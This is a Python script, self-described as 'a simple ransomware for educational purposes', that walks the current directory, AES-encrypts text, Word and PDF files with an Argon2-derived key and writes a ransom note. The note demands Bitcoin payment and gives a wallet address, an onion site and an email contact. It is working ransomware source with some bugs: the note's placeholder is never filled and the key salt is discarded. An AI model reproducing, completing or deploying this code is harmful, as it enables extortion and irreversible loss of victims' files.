import os
import random
import argparse
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from argon2.low_level import hash_secret, Type
from tqdm import tqdm

def derive_key(password, key_salt):
    return hash_secret(password.encode(), key_salt, time_cost=2, memory_cost=102400, parallelism=8, hash_len=32, type=Type.ID)

def get_files_to_encrypt(base_dir):
    file_list = []
    for root, dirs, files in os.walk(base_dir):
        for filename in files:
            if os.path.splitext(filename)[1] in [".txt", ".docx", ".pdf"]:
                if not filename.endswith('_encrypted'):
                    encrypted_filename = derive_encrypted_filename(filename)
                    if not os.path.exists(os.path.join(root, encrypted_filename)):
                        file_list.append((os.path.join(root, filename), os.path.join(root, encrypted_filename)))
    return file_list

def encrypt_file(key, original_filename, encrypted_filename):
    try:
        with open(original_filename, 'rb') as f:
            data = f.read()
        iv = get_random_bytes(AES.block_size)
        cipher = AES.new(key, AES.MODE_CFB, iv=iv)
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        with open(encrypted_filename, 'wb') as encrypted_file:
            encrypted_file.write(iv + encrypted_data)
    except Exception as e:
        print(f'Error encrypting {original_filename}: {e}')
        if os.path.exists(encrypted_filename):
            os.remove(encrypted_filename)
        raise

def derive_encrypted_filename(original_filename):
    filename, extension = os.path.splitext(original_filename)
    return f"{filename}_encrypted{extension}"

def create_ransom_note(ransom_note_filename):
    with open(ransom_note_filename, 'w') as f:
        address = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        wallet_instruction = '(https://bitcoin.org for Bitcoin).'
        ransom_instruction = (
            "============================================================================\n"
            "| WARNING!!! Your files have been encrypted. Releasing your files requires\n"
            "| the purchase of a unique decryptor. Please follow these instructions to\n"
            "| regain access to your files:\n"
            "| 1. Download and install a secure cryptocurrency wallet (e.g.,\n"
            "|     https://www.bitaddress.org/ for Bitcoin).\n"
            "| 2. Send the exact amount of 0.15 Bitcoins shown below to the following\n"
            "|     address within 72 hours:\n"
            "|     <BITCOIN_ADDRESS>\n"
            "| 3. After sending the payment, please message us through an anonymous\n"
            "|     communication method like \n"
            "|     - Tor network: http://nk7r4qenumge.onion/ \n"
            "|     - Pastebin: https://pastebin.com\n"
            "|     - Email (NOTE: this might take longer): hacked@mail.com \n"
            "|     Please include the Bitcoin transaction ID and provide any additional\n"
            "|     information about your encryption and system.\n"
            "|     Our team will verify your payment and contact you with further\n"
            "|     instructions for regaining access to your data.\n"
            "| 4. If you wish to test the decryptor before purchasing, create an\n"
            "|     additional payment of 0.0005 Bitcoin to the same address within 72\n"
            "|     hours as well. This will send a test decryptor file to your\n"
            "|     inbox without modifying your original encrypted files.\n"
            "|     Please include this information in your message if you choose to\n"
            "|     test the decryptor first.\n"
            "| Attention: Do not attempt to modify or decrypt the files on your own,\n"
            "|            as this may result in permanent file loss.\n"
            "============================================================================\n"
        )

        f.write(ransom_instruction % {'BITCOIN_ADDRESS': address})

def main():
    parser = argparse.ArgumentParser(description='A simple ransomware for educational purposes.')
    parser.add_argument('password', help='Password used to encrypt the data.')
    args = parser.parse_args()

    ransom_note = 'ransom_note.txt'
    create_ransom_note(ransom_note)

    key_salt = get_random_bytes(16)
    key = derive_key(args.password, key_salt)

    encrypted_files = get_files_to_encrypt(os.getcwd())
    for original_filename, encrypted_filename in tqdm(encrypted_files):
        encrypt_file(key, original_filename, encrypted_filename)

if __name__ == '__main__':
    main()